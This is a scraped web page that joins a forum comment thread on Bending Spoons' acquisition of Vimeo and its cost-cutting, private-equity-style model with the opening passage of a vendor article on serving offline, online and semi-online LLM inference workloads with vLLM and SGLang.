    &lt;p&gt;Why would it be detrimental to society? Many companies have developed all the products they're likely to ever develop, so why would you maintain the same level of operational costs as when you expected growth? There's no guarantee that the prices charged before the acquisition were sustainable either.&lt;/p&gt;
    &lt;p&gt;They don't just maintain these products, they enshittify them to extract the maximum possible profit from captive users, until someone else comes in and builds everything from scratch all over again.&lt;/p&gt;
    &lt;p&gt;This is crazy inefficient yet it's not captured in our economic theories, so we're essentially blind to it.&lt;/p&gt;
    &lt;p&gt;SaaS is the detriment to society. Static feature software continually updated and changed to create a faux justification for $20 of your money a month, keeping you on an endless treadmill to in order to work with all your old data.&lt;/p&gt;
    &lt;p&gt;Sometime in the late 00's they realized people were still happily using software from the 90's, because it worked for their needs, and well, we can't have that...&lt;/p&gt;
    &lt;p&gt;Not much you can do. The alternative is bankruptcy that does a similar thing to workers. But it at least doesn't let the company make blatant lies of a PR statement.&lt;/p&gt;
    &lt;p&gt;The main thing to do is make it so you can't just lay off people as easily as you can in the US for pretty much no reason. But it seems workers are still too divided to really come together and achieve such 9initiatives. Be it unions, pressuring their governments to make new laws, or simply chastising and boycotting companies who engage on such actions.&lt;/p&gt;
    &lt;p&gt;Society has more money and way more votes than PE. I'm going to quote A Bugs Life (1998) of all things here:&lt;/p&gt;
    &lt;p&gt;&amp;gt; Hopper: You let one ant stand up to us, then they all might stand up! Those puny little ants outnumber us a hundred to one and if they ever figure that out there goes our way of life! It's not about food, it's about keeping those ants in line.&lt;/p&gt;
    &lt;p&gt;What if there isn't a feasible path for expansion and growth? Vimeo already has contracting revenue, it's either in the maturity or decline phase.&lt;/p&gt;
    &lt;p&gt;Some customers will churn, some will stay, Bending Spoons are the masters of this model so will have made an assumption on how revenue will change across the next 5-10 years+, but I would assume that they aren't forecasting extreme growth, and instead are calculating that net profit can be changed from c$30m to c$139m within existing revenue, so if they can keep revenue at/near current levels without growth, they can end up with a much more profitable business.&lt;/p&gt;
    &lt;p&gt;Bear in mind that same revenue doesn't necessarily mean the same number of customers - it can also mean raising prices and having less customers. Bending Spoons might estimate that if they double prices, half their customers might leave - this would still be BRILLIANT for profit, as while revenue would stay the same, some costs would half, and thus profit might jump from c$140m to c$250m based on some napkin math!&lt;/p&gt;
    &lt;p&gt;You're assuming all or most paying customers are paying attention. That is sometimes not the case. For example folks/businesses who forgot they signed up. Alternatively it could be that the cost to switch is too painful.&lt;/p&gt;
    &lt;p&gt;For example, they bought the German hiking and cycling app Komoot. It's a mature app in terms of functionality, with a stable user base. There's little chance of hypergrowth with this type of app. It's also complicated to switch apps because transferring routes, collections, photos, etc. to another service is difficult.&lt;/p&gt;
    &lt;p&gt;They laid off 90% of the teams. They migrated the app to their infrastructure to pool costs. Since then, there has been no further development of the service.&lt;/p&gt;
    &lt;p&gt;It's also complicated to switch apps because transferring routes, collections, photos, etc. to another service is difficult.&lt;/p&gt;
    &lt;p&gt;Not really, sync everything through Strava, and then drop whichever service you don't want. Basically any bike ride I've done in the past decade is on 3+ services because they all sync.&lt;/p&gt;
    &lt;p&gt;I imagine a lot of companies have contracts with Vimeo and switching costs are real. They'll likely stick with Vimeo if they manage to maintain their offering to the level it exists at today. In the long term I think it guarantees death but they will be able to extract plenty of money before that happens.&lt;/p&gt;
    &lt;p&gt;They did the same thing with Komoot and other apps. I don't understand where the money comes from and how they are planning to keep this portfolio growing.&lt;/p&gt;
    &lt;p&gt;It seems to all be debt financed, i.e. just a private equity model slightly specialized for tech. The "innovation" is that Bending Spoons has an in-house engineering team it seems they try to keep constant yet scale out to all the acquisitions. I hadn't looked into them much before, but https://www.colinkeeley.com/blog/bending-spoons-operating-ma... is an interesting report -- though not focused on the finance side.&lt;/p&gt;
    &lt;p&gt;(For Komoot) Did they, though? I am aware of the layoffs, but after that they slightly redesigned the app, collected the poll for next year's requested features, the lifetime maps option is still there to buy etc. If not for HN, I wouldn't have noticed any change in the direction that it's going in.&lt;/p&gt;
    &lt;p&gt;I suspect that the VAST majority of users want their saas tools to do today what they did yesterday, and so stopping active development of new features is actually a positive - no sudden Liquid Ass is going to appear in a program in maintenance mode.&lt;/p&gt;
    &lt;p&gt;My best guess is that a part of it is replacing US (or in this case Israeli) devs with much cheaper Italian/European ones, earning ~a quarter of their US counterparts and working longer hours, as Bending Spoons has an extremely competitive hiring process, and is probably the highest paying tech company in Italy&lt;/p&gt;
    &lt;p&gt;This is just my personal opinion, but if they didnt change the price of Evernote and never made any changes, I probably would remain a customer for a very very long time. There is a high switching cost for me to use any app to move all my docs, and notes.&lt;/p&gt;
    &lt;p&gt;I dont know if the same can be said for Vimeo, though&lt;/p&gt;
    &lt;p&gt;This requires reinvesting profits into the company. It sounds like they choose not to do that, but instead switched to cashing in.&lt;/p&gt;
    &lt;p&gt;If the profits are stable and supported by a fraction of the workforce, then why keep the rest around? Clearly a shitty thing to do, but business-wise it makes sense.&lt;/p&gt;
    &lt;p&gt;One of the advantages of their business model is that it's low risk. Find a business you can get cheap enough, shut off all investment related to growth or product improvement, and use the product's moat to get as much cash as possible from current customers. Business doesn't have to be about expanding into new markets or growing revenue. If I had to guess, there's not much of a market for the companies they're acquiring because everyone else is looking for growth.&lt;/p&gt;
    &lt;p&gt;So it's sort of a "white-dwarf maker" company. Pick a company with a steady cashflow, eject all the fluff that made it a big star, and collect the remaining energy / cash until the core cools down. The end state is a cold slab of iron, and nothing new is going to happen to the acquired business ever since, but the plentiful (if dwindling) cashflow will be collected without any obstacles.&lt;/p&gt;
    &lt;p&gt;The growth comes from increasing subscription value, not from adding users. They bet that the platform is sticky enough for the users that they’ll slowly boil the frog until there’s no more equity left.&lt;/p&gt;
    &lt;p&gt;Bait and switch is something completely different.&lt;/p&gt;
    &lt;p&gt;If you started buying Evernote 10 or 15 years ago, and use it a lot, then Evernote gets acquired and the terms change, that's shitty but is not remotely a "bait and switch."&lt;/p&gt;
    &lt;p&gt;No, they just come in and offer a lot of money to the current owners. Bending spoons are ruthless businesspeople but AFAIK they do offer a reasonable price for the businesses they acquire.&lt;/p&gt;
    &lt;p&gt;(I used to work for WeTransfer and some time after I left it got acquired at about the price it was once considering IPO-ing at. This was apparently such a good offer that it took very little deliberation to agree to the deal.)&lt;/p&gt;
    &lt;p&gt;but where does the money come from? it seems like a good way to avoid regulatory scrutiny if your acquisition goal is to simply exit a competitor from the market.&lt;/p&gt;
    &lt;p&gt;What I understand from listening to the management from various podcasts, it was a mix of shipping the most minimum impactful features with the leanest product team needed and then jacking up the price every year for the people that can't move away from these products.&lt;/p&gt;
    &lt;p&gt;The long tail of revenue is not only a substantial sum, but decays more steadily than growth. This is a low risk investment that still turns a profit.&lt;/p&gt;
    &lt;p&gt;It's also not their only investment or even necessarily their own money. Individual holding companies don't tell you much about the larger pool of money they come from.&lt;/p&gt;
    &lt;p&gt;you're absolutely right, they're not positioned for expansion or growth. you're very close to seeing the private capital dark pattern that's become a huge part of our economics lately. let me illustrate for you how they make money by decoupling the company's success from the investors' success&lt;/p&gt;
    &lt;p&gt;1) borrow a bunch of money to buy the company - this is called a leveraged buyout&lt;/p&gt;
    &lt;p&gt;2) once you're in control, have the company assume the debt you took on in order to buy it. you as the buyer are now free and clear, and the company is now responsible for paying back the money you borrowed to buy it. the end result of this transaction is that the company now owns stock that is less desirable because the company is more leveraged&lt;/p&gt;
    &lt;p&gt;3) make huge cuts everywhere and use the money "saved" by divesting from your own future to pay yourself as a consultant&lt;/p&gt;
    &lt;p&gt;The company is now in the extremely fragile position of not being able to spend to respond to the market because all of their income is going to servicing debt and paying the members of the private capital group. the "investors" aren't actually invested at all because even if the stock they hold becomes worthless they didn't pay anything for it in the first place, the company did. the thing limps along for as long as it can keep bringing in some small amount of income for the "investors" to skim off the top of, then it inevitably dies like anything riddled with parasites will, the company declares bankruptcy and they sell the copper out of the walls in order to pay back the loan used to take the company private in the first place&lt;/p&gt;
    &lt;p&gt;Look at the companies they're acquiring - it's 100% about getting user data and tertiary monetization, and they're making bank. They couldn't care less about what the companies they buy supposedly do.&lt;/p&gt;
    &lt;p&gt;This is the same model Computer Associates used to run back in the day. Find product with marginal profit but dedicated user base, cut costs, increase pricing and milk it until the next product comes along.&lt;/p&gt;
    &lt;p&gt;Is this any different than the SaaS business model, except a 3rd party bought the company to strip it?&lt;/p&gt;
    &lt;p&gt;Everything SaaS these days, hell every subscription these days seems to involve product enshittification + rising pricing. Is this the end game of the financialization of everything?&lt;/p&gt;
    &lt;p&gt;Oh, it will - but they don't care. I'm sure they'll eek out 1.5b from their 1.3b acquisition and be happy as clams.&lt;/p&gt;
    &lt;p&gt;It certainly is depressing to look at what was built and what could be made of it but most of the folks with money lack the creativity or skill to actually build a lasting business. Just burn it down and rob it on the way out - such is the modern economy.&lt;/p&gt;
    &lt;p&gt;I mean, Broadcom / VmWare is basically doing the same, just more for enterprise level software.&lt;/p&gt;
    &lt;p&gt;OTOH - if Vimeo has given up all hope of further new features, then giving current users the chance to keep going isn't completely evil, even if it's at a higher price. VmWare is basically doing the same, and lots of customers are leaving, and those who aren't may still eventually do so, etc. (Edit: what if the alternative was Vimeo shutting down?)&lt;/p&gt;
    &lt;p&gt;Think of vintage car parts - if you absolutely want to restore that '30s Ford (keep using 20+ year old software) - someone offering an OEM-equivalent part for 3x what it cost back in the day (even adjusted for inflation) may actually still be good value - because what other alternatives are there?&lt;/p&gt;
    &lt;p&gt;Now - does it suck for the employees? Sure. One thing an econ prof said back in the late 90s (who loved to guest-lecture to CS/SWEng students): your job as a software person is to put other people out of work by automating stuff they used to do manually. Are you ok with that? Because if you're not, you should go into a different industry right now. Feels much worse when it's programmers getting the axe due to finance types, but not unexpected.&lt;/p&gt;
    &lt;p&gt;Elon Musk acquired Twitter and fired %80 of the employees and it was just fine.&lt;/p&gt;
    &lt;p&gt;I bet there's so many more people that can be let go from all tech industry. It's mature and product discovery is mostly locked behind advertisement so what's left is exploitation.&lt;/p&gt;
    &lt;p&gt;If you think about it, as long as you don't mingle much with the product that works it keeps working indefinitely. It's no different than running Excel or WhatsApp, especially when the servers are managed by 3rd party providers these days.&lt;/p&gt;
    &lt;p&gt;Losing tens of billions of dollars on a company now ruined down to single digit billions of revenue is a weird thing to describe as "just fine". That looks like abject failure as a business.&lt;/p&gt;
    &lt;p&gt;This is potentially disastrous to content on the web. Vimeo provides a platform-as-a-service known as OTT, that powers well known branded streaming services, like Criterion Channel, HistoryHit, Dropout, DIRTVision, Speed 51, URLTV, Armflix, MHz Choice, Trinity Broadcasting Network, SommTV, IndieFlix, BroadwayHD, Full Moon Features, etc.&lt;/p&gt;
    &lt;p&gt;As a longtime user of Vimeo (since 2009), I was afraid this was going to happen. I built our own HLS video streaming in-house a couple of years ago and never looked back. Way faster, lightweight player, uses modern apis and codecs.&lt;/p&gt;
    &lt;p&gt;Now I'm working on productizing that at https://framerate.com/ (beta launches next week!)&lt;/p&gt;
    &lt;p&gt;Nice work. Aren’t there decent open source alternatives though? What do you think your differentiation will be vs. a customer using an open source solution and hosting the video chunks on a CDN - or even S3?&lt;/p&gt;
    &lt;p&gt;There aren't any end-to-end open source video host solutions out there from what I can tell. DIY ffmpeg + a CDN is a great way to go. But quickly erodes when you want all the other niceties that are table-stakes today (like storyboards, subtitles, chapters, etc.).&lt;/p&gt;
    &lt;p&gt;I'll have all the niceties, but I plan to differentiate mainly on performance and quality.&lt;/p&gt;
    &lt;p&gt;- Higher quality compression (via AV1 encoding) - Fast load times worldwide (Framerate's custom player is 18kb gzipped versus 200kb+ for vidstack/mux) - Better publishing experience (bulk editing options, team collaboration, etc.)&lt;/p&gt;
    &lt;p&gt;Probably they will also fire remaining 15 people and move everything to Italy.&lt;/p&gt;
    &lt;p&gt;Their strategy is to&lt;/p&gt;
    &lt;p&gt;- fire everyone,&lt;/p&gt;
    &lt;p&gt;- give product to very small but ambitious team of people&lt;/p&gt;
    &lt;p&gt;- cut free version of the product to minimum even if does not make a sense to have a free version such as 5 video upload per month etc (they are doing this just to avoid backlash from users and community)&lt;/p&gt;
    &lt;p&gt;- use every possible dark pattern exist to get every penny from the users&lt;/p&gt;
    &lt;p&gt;An interesting aspect is that they acquire US companies, where it is legally possible to lay off employees. In Italy, where BS is based, firing employees is much more difficult&lt;/p&gt;
    &lt;p&gt;That's partially due to history: Vimeo was split out of CollegeHumor, and CollegeHumor became Dropout. (Both were part of IAC and were spun out/sold off.)&lt;/p&gt;
    &lt;p&gt;Dropout originally only used Vimeo for video distribution. They switched to Vimeo for OTT only after running their own with a team of developers and finding it to be an unexpectedly hard task. I think I learned that in the Sam Reich Hank Green Decoder interview.&lt;/p&gt;
    &lt;p&gt;Well, some good news is that if you've ever wanted to build a new video streaming platform there are a bunch of companies that'd love to sign up.&lt;/p&gt;
    &lt;p&gt;I'm sure dropout et all will be able to continue with their same level of functionality in the short term but I can imagine the bills they'll be receiving will be escalating quickly.&lt;/p&gt;
    &lt;p&gt;Dropout's CEO has been pretty open about the company, and he described their early efforts as 'Brutal'&lt;/p&gt;
    &lt;p&gt;&amp;gt; No! We tried, but people don’t realize this. The first rendition of Dropout was built on Vimeo OTT’s API, but it was our own product. We employed something like eight sophisticated engineers at IAC to build our own product around it, and it was brutal. Which is to say, it’s just very hard to do very well. And these were great engineers.&lt;/p&gt;
    &lt;p&gt;I routinely see job postings by them in my local dev circles, significantly above market rate, and the offers seem to keep reappearing forever. Their site namedrops known apps and services like wetransfer but otherwise seems to be just buzzwords.&lt;/p&gt;
    &lt;p&gt;Are they VC buying existing IPs? What is exactly going on?&lt;/p&gt;
    &lt;p&gt;I guess that companies which get bought might be a bit "overstaffed" from the startup phase or because planned further development. If one removes this staff, you need less people to minimally maintain a running app. But itcs just a guess, you'll loose knowhow too, when drastically reducing your staff.&lt;/p&gt;
    &lt;p&gt;I describe Bending Spoons as an Italian private equity company. The CEO openly admits that the business model involves buying companies and trying to squeeze as much profit out of them.&lt;/p&gt;
    &lt;p&gt;This comment from e98cuenc seems extremely prescient.&lt;/p&gt;
    &lt;p&gt;&amp;gt; Everybody loves to hate BendingSpoon, but there is a lesson here. They consistently rewrite the code of their acquisitions with a tiny team, fire everybody and are able to maintain and improve the product. They basically skip everything but engineers, and they are kept at a minimum. Feedback from users is the products they take over 1) become more expensive, 2) they ship features waaaay faster. It looks like next generation private equity, and my guess is more houses will start copying them&lt;/p&gt;
    &lt;p&gt;Considering what Bending Spoons did to Meetup.com after buying the site, I wouldn't trust them to improve a product. Here are some of the issues I noticed.&lt;/p&gt;
    &lt;p&gt;- Group searches consistently return irrelevant results across multiple cities. As a test, I tried searching for soccer groups in Dallas, Texas, and one of the results was for a backgammon group. Users will also often have a hard time finding events I host on Meetup. - An organizer being charged $357.98 per year to host a group on Meetup.com. - The pages for my Meetup events are full of clutter and duplicate data, while relevant information such as RSVPs is hidden. - My Meetup.com home page is full of pointless distractions, including a banner asking me to become an organizer when I already organize events. - When editing an event, Meetup shows an option to generate a description by using generative AI. Generative AI is a scam and I try to avoid it.&lt;/p&gt;
    &lt;p&gt;That being said, you are right that they are becoming more expensive and ship features faster. I describe Bending Spoons as Italian private equity.&lt;/p&gt;
    &lt;p&gt;As a heavy Meetup user, I can say that Bending Spoons absolutely fixed some glaring, long-standing bugs. But their massive price increases have really driven people away, and some of their attempts to grab more money (Meetup+) really rankled a lot of people. Also, search still sucks.&lt;/p&gt;
    &lt;p&gt;Honestly, I wish more businesses would do this. It turns out that grandiose dreams make grandiose staffing, but a lot of great business ideas would thrive and bloom if the gardeners would just prune them back more often.&lt;/p&gt;
    &lt;p&gt;Yes bending spoon will stop growing these companies and stop add features. These role will be just replaced by engineers and employee in Italy, where bending spoon is form, and where people cost many times less than in the US. Italy is like a higher quality India in a sense.&lt;/p&gt;
    &lt;p&gt;Bending Spoons pays very high rates for their own engineers.&lt;/p&gt;
    &lt;p&gt;Of course if your comparison is Bay Area or Zurich, there's no match, but if you exclude such outliers (where the compensation is what it is due to the insane costs of living and competition for talent) they are paying rates higher than pretty much any other part of the world.&lt;/p&gt;
    &lt;p&gt;They pay rates that are closer if not higher than London or Munich averages (which are very high).&lt;/p&gt;
    &lt;p&gt;&amp;gt; Italy is like a higher quality India in a sense.&lt;/p&gt;
    &lt;p&gt;It's attitudes like this that rub decisionmakers who aren't of European heritage the wrong way.&lt;/p&gt;
    &lt;p&gt;Italian salaries [0] aren't significantly different from Indian salaries [1] in tech, especially in major hubs like Bangalore [2].&lt;/p&gt;
    &lt;p&gt;If companies like Google [5], Broadcom [6], and Nvidia [7] can afford to pay EU level salaries in India and decided to heavily invest in hiring in India, it shows that Indian talent can't be underestimated.&lt;/p&gt;
    &lt;p&gt;Also, a European dismissing Indian developer quality doesn't bode well as your governments are signing an FTA [3] and a security and defense partnership [4] with India in a couple days, and with the Italian government soliciting Indian capital for infrastructure investment [8] and the French government soliciting Indian capital for defense investment [9].&lt;/p&gt;
    &lt;p&gt;Wonder what this means for vimeo/psalm, the static analyzer for PHP, which has recently seen some new life breathed into it after long neglect. Psalm has credible alternatives in PHPStan and now Mago, but it would still be a loss to see it go unmaintained again.&lt;/p&gt;
    &lt;p&gt;I was wondering what I used by this company because I saw the name yesterday. It's Harvest, and I was thinking yesterday how the sign up and pricing page seems more or less abandoned. Guess it's time to roll my own version&lt;/p&gt;
    &lt;p&gt;Our business uses Vimeo because we get a discounted rate on acami CDN via their bulk purchasing power. YouTube is free but that comes with a lot of headaches. For example not being able to hide the recommended videos at the end of a video, which annoyed our clients in the past when we did use YouTube. YouTube also needs to be public to be embeddable, which also created issues for us. However this announcement has me terrified and literally scrambling for a backup plan.&lt;/p&gt;
    &lt;p&gt;Youtube also doesn't let you replace an already-uploaded video while maintaining the URL, which is incredibly painful if you need to edit a posted video for whatever reason.&lt;/p&gt;
    &lt;p&gt;If it's a small number of videos, specifically ones that are unlikely to go viral, then a self-hosted or externally paid hosted peertube site might be a good option.&lt;/p&gt;
    &lt;p&gt;Vimeo you manage your brand and presentation. YouTube you have little control over where or how your video is presented. Vimeo also provides VOD for some large brands and media companies.&lt;/p&gt;
    &lt;p&gt;Yeah, it's this. It's a hosting platform, not a social media platform. You see a ton of people who have short films, art projects, commercial portfolios and stuff like that hosted at Vimeo. They don't need/want comments, discoverability, or to deal with things like automated DRM takedowns. Clean, simple, video hosting.&lt;/p&gt;
    &lt;p&gt;I built my own course presentation platform (for my own courses, not as a thing I resell), but I wasn't going to host my own videos. I use Vimeo. It's great: I upload to them, embed an iframe, job done. I don't care about maintaining a video player or bandwidth or subtitles or…&lt;/p&gt;
    &lt;p&gt;Literally the week after I launched my thing, they got bought. I have no idea what I'll do if they go to shit.&lt;/p&gt;
    &lt;p&gt;i have made https://codekeep.io for storing snippets, have similar features to evernote. all users will get free pro membership now. if you are thinking about moving , please consider codekeep too.&lt;/p&gt;
    &lt;p&gt;I just cancelled my account that I've had for about 10 years... maybe longer. I barely used it, but it's now &amp;gt;$100/year for my plan. I had maybe 15 videos uploaded that I would share occasionally.&lt;/p&gt;
    &lt;p&gt;I used to be an indie filmmaker and used it to host features when nothing else could. I’ve been paying since 2008. The price would go up but they were great so I let it be.&lt;/p&gt;
    &lt;p&gt;What I've always found unusual (but not necessarily bad) about BS is ... how come a company that came out of nowhere starts buying tech companies here and there? Billion dollar deals? In cash?&lt;/p&gt;
    &lt;p&gt;It can't be just a few "enthusiastic" random guys (as they portray), you need a lot of capital to pull that off.&lt;/p&gt;
    &lt;p&gt;IMO they're someone's family office with an obfuscated name.&lt;/p&gt;
    &lt;p&gt;Edit: and my comment suddenly goes to the bottom despite having several upvotes ... definitely not sus.&lt;/p&gt;
    &lt;p&gt;The founder recently went on invest like the best and explained it top to bottom, they started as a broke agency and grew from there quite fast. I forget the details but I would imagine they are financed quite heavily by LP's&lt;/p&gt;
    &lt;p&gt;Someone has actual financial plan. I know a unknown thing for VC and startups. If they do and can calculate reasonable rat of return on acquisition it makes sense for lot of investors. Especially when they start to have proven record.&lt;/p&gt;
    &lt;p&gt;Having paying customers, stopping giving things away for free and then cutting costs like wages and moon shots projects. A software starts to be tech again. That is marginal unit costs really do work.&lt;/p&gt;
    &lt;p&gt;- Buy a product that has name recognition overshadowed by a monopolistic company and the leadership is trying to make a pivot and failing terribly.&lt;/p&gt;
    &lt;p&gt;- Leadership is aggressively rebranding to appease a takeover. They keep doing the most basic forbes council op-ed title moves to make the product appealing.&lt;/p&gt;
    &lt;p&gt;- It is not a parts-shop, the team is used to sense of "eh what you are going to do about it". It is a signboard and patents that you can use to hostage bigger companies.&lt;/p&gt;
    &lt;p&gt;- The takeover company has figured out maintenance engineering. You buy the product, you cull the team because they are not a growth engine. You focus on maintenance, and you milk the brand. Any eastern European or LATAM team can approve an automated version bump PR and send out "let's jump on a call" email.&lt;/p&gt;
    &lt;p&gt;Heck, even Tai fricking Lopez bought Radio Shack under similar pretense.&lt;/p&gt;

  &lt;main&gt;&lt;head rend="h1"&gt;The three types of LLM workloads and how to serve them&lt;/head&gt;&lt;p&gt;We hold this truth to be self-evident: not all workloads are created equal.&lt;/p&gt;&lt;p&gt;But for large language models, this truth is far from universally acknowledged. Most organizations building LLM applications get their AI from an API, and these APIs hide the varied costs and engineering trade-offs of distinct workloads behind deceptively flat per-token pricing.&lt;/p&gt;&lt;p&gt;The truth, however, will out. The era of model API dominance is ending, thanks to excellent work on open source models by DeepSeek and Alibaba Qwen (eroding the benefits of proprietary model APIs like OpenAI's) and excellent work on open source inference engines like vLLM and SGLang (eroding the benefits of open model APIs powered by proprietary inference engines).&lt;/p&gt;&lt;p&gt;Engineers who wish to take advantage of this technological change must understand their workloads in greater detail in order to properly architect and optimize their systems.&lt;/p&gt;&lt;p&gt;In this document, we'll walk through the workloads and requirements we've seen in the market, working with leading organizations deploying inference to production at scale. We'll explain the challenges LLM engineers face when building for these workloads and how they solve those challenges. And we'll share a bit about how you can implement those solutions on our cloud platform.&lt;/p&gt;&lt;head rend="h2"&gt;The breakdown: offline, online, and semi-online&lt;/head&gt;&lt;quote&gt;&lt;p&gt;Gallia est omnis divisor in partes tres.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;In the more mature world of databases, there is a well-known split between transaction processing (OLTP, think "shopping carts") and analytical processing (OLAP, think "Year Wrapped"). In between are hybrid workloads (HTAP) with the characteristics of both.&lt;/p&gt;&lt;p&gt;A similar three-part division has helped us organize LLM workloads:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;offline or analytical workloads, which operate in batch mode, write to data stores asynchronously, and demand throughput above all else,&lt;/item&gt;&lt;item&gt;online or interactive workloads, which operate in streaming mode, communicate synchronously with humans, and demand low latency, and&lt;/item&gt;&lt;item&gt;semi-online or bursty workloads, which operate on streams of batches, communicate with other live computer systems, and demand flexible infrastructure.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Our recommendations for each are as follows:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;for offline workloads, we recommend using vLLM via asynchronous RPC to ad hoc, auto-scaled compute capacity&lt;/item&gt;&lt;item&gt;for online workloads, we recommend using SGLang with excess tensor parallelism and EAGLE-3 speculative decoding on live edge Hopper/Blackwell GPUs accessed via low-overhead, prefix-aware HTTP proxies&lt;/item&gt;&lt;item&gt;for semi-online workloads, we recommend using either engine with rapid autoscaling of ad hoc compute capacity that can handle variable load per-replica&lt;/item&gt;&lt;/list&gt;&lt;p&gt;We will unpack and justify these recommendations, with reference to both specific applications &amp;amp; workloads that run on our platform and sample code that you can work off of, in the remainder of this document.&lt;/p&gt;&lt;head rend="h2"&gt;Offline workloads demand throughput&lt;/head&gt;&lt;quote&gt;&lt;p&gt;The law of increasing return may be worded thus: An increase of labour and capital leads generally to improved organization, which increases the efficiency of the work of labour and capital.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;The Weaviate Transformation Agent augments and updates entire datasets by applying an LLM to each row.&lt;/p&gt;&lt;p&gt;A leading video transcription service needs to produce LLM summaries of a large volume of recorded calls for later search and retrieval.&lt;/p&gt;&lt;p&gt;These systems are offline: they produce information for long-term storage in another computer system (like a filesystem or a database). Workloads are submitted as bulk "jobs" composed of many LLM requests. The entire job should be completed quickly, for cost reasons, but no single request requires immediate service. The scale of the job exposes substantial parallelism, which allows for economies of scale.&lt;/p&gt;&lt;p&gt;Offline systems are generally easier to architect â computer systems began as offline batch-processing machines for a reason! But they still have their challenges.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Maximizing throughput per dollar&lt;/head&gt;&lt;p&gt;The core challenge of offline, batch workloads is to maximize the throughput while controlling cost by taking advantage of intra-batch task parallelism.&lt;/p&gt;&lt;p&gt;Fundamentally, this is good news. The most popular and readily-available hardware for running LLM inference, GPUs, are designed for maximum throughput, from their per-clock-cycle context switching and large matrix multiplication units to their task-parallel programming model. That makes it relatively easy to write inference kernels that saturate compute resources, and the open source and freely available kernels are satisfactory. Additionally, training of LLMs and other neural networks is an offline, batch workload, and training workloads have historically gotten the most and the quickest attention, e.g. when new hardware enters the market.&lt;/p&gt;&lt;p&gt;But kernels are not the only code required to take advantage of parallelism in offline workloads. As one prominent example, batches must be constructed out of live and pending tasks (aka requests). Intra-task LLM inference work can be split into two phases: prefill (aka prompt processing) and decode (aka generation). Prefill work can be further split into chunks. With care, all of these kinds of work can be scheduled together for different tasks in the same batch.&lt;/p&gt;With mixed batching, less-compute-intensive decode work (thinner lines) can piggyback on more compute-intensive prefill work (thicker lines). Colors indicate different tasks. For details, see the SARATHI paper.&lt;p&gt;The vLLM inference engine has better support for these scheduling optimizations. For this reason, we currently recommend it for throughput-sensitive, offline workloads.&lt;/p&gt;&lt;head rend="h3"&gt;Implementation&lt;/head&gt;&lt;p&gt;We make the following choices to optimize for throughput (per dollar) in offline applications:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Run on vLLM with async scheduling and chunked prefill.&lt;/item&gt;&lt;item&gt;Send large batches in each request to expose maximum parallelism to the engine. This is easiest with an offline interface, like the &lt;code&gt;LLM&lt;/code&gt;abstraction in vLLM's Python SDK, rather than the online-serving-oriented HTTP server interfaces.&lt;/item&gt;&lt;item&gt;On Modal, use asynchronous RPC with &lt;code&gt;.spawn&lt;/code&gt;or&lt;code&gt;.spawn_map&lt;/code&gt;to queue up large numbers of requests for later retrieval or storage.&lt;/item&gt;&lt;item&gt;Limit the number of GPUs per replica to the minimum required to run on a large enough batch to saturate the GPU's compute resources. Excess available GPU capacity should be instead shifted to running more replicas.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;You can find these patterns demonstrated and explained in detail in this code sample.&lt;/p&gt;&lt;head rend="h3"&gt;Future considerations&lt;/head&gt;&lt;p&gt;As the reliability of models increases and as their use becomes more commonplace, we expect more and more batch workloads to operate quietly in the background of many businesses, just as data analytics jobs, which started out as rare, heroic tabulations like censuses, are now humdrum table stakes.&lt;/p&gt;&lt;p&gt;We've noticed an interesting pattern in GPU pricing, which shows up in our own current rates at time of writing: the FLOPs per dollar is roughly constant, so older GPUs that might be easier to come by (in on-premises deployments) or available in larger quantities (on platforms like Modal) serve quite nicely for jobs that care about throughput per dollar more than they care about throughput per second.&lt;/p&gt;&lt;head rend="h2"&gt;Online workloads abhor latency&lt;/head&gt;&lt;quote&gt;&lt;p&gt;When a computer and its users interact at a pace that ensures that neither has to wait on the other, productivity soars, the cost of the work done on the computer tumbles, employees get more satisfaction from their work, and its quality tends to improve. Few online computer systems are this well balancedâ¦&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Agents built with Decagon Voice need to participate in phone calls with humans requesting support help.&lt;/p&gt;&lt;p&gt;A leading AI IDE company needs to serve "smart" auto-completion in the brief intervals while human engineers consider what code to write next.&lt;/p&gt;&lt;p&gt;These systems are online: a human user is interacting with the system, and they want responses that match their (and other humans') reaction time, on the order of at most a few hundred milliseconds. Human users create multi-turn contexts from their repeated interactions.&lt;/p&gt;&lt;p&gt;Online systems are extremely challenging to build. They are extremely performance-sensitive, and performance melts abstractions and couples decoupled concerns. But they can be built, if you can solve the attendant challenges.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Avoiding host overhead&lt;/head&gt;&lt;p&gt;The primary challenge of online workloads is that the system has only a few hundred milliseconds to respond.&lt;/p&gt;&lt;p&gt;First, that means that the performance hits from using interpreted languages, like Python, start to matter. Leading LLM inference engines are written mostly in Python, for faster development, and so they need to be architected and implemented carefully to avoid the work on the CPU (or host) from blocking the work on the GPU â inflicting "host overhead". We wrote about the kinds of host overhead inference workloads encounter, and how we've contributed to inference engines to solve them, in this blog post.&lt;/p&gt;&lt;p&gt;In our experience, the SGLang inference engine wins here, since it generally exhibits lower host overhead.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Reducing communications overhead&lt;/head&gt;&lt;p&gt;To repeat: the primary challenge of online workloads is that the system has only a few hundred milliseconds to respond.&lt;/p&gt;&lt;p&gt;We are here considering LLM inference services, rather than local applications, and so communication between the client and the system can introduce notable latency at this timescale. Specifically, networks operate at a large fraction of the speed of light, but that means tens or even hundreds of milliseconds of latency for clients (assumed Earthbound) to a system implemented in a single geographic location.&lt;/p&gt;&lt;p&gt;The solution is to deploy both routing proxies and accelerator capacity to "the edge", i.e. into datacenters that are close to clients. Quite apart from narrow-sense technical issues, this can prove challenging due to market conditions, as not all cloud providers have available capacity of all GPU types in all regions. At Modal, we solve this by aggregating capacity across clouds, which support regionalized service deployments.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Handling multiple turns&lt;/head&gt;&lt;p&gt;Online workloads are interactive not just in latency requirement but also in request patterns. Human users respond to the system's response, which the system must respond to in turn.&lt;/p&gt;&lt;p&gt;Unlike a (nominally) stateless protocol like HTTP, efficient multi-turn LLM inference is stateful. It may not look that way, since clients generally provide the entire conversation history in their requests. But contemporary models based on the Transformer architecture have computation requirements that scale quadratically with conversation length. This can be 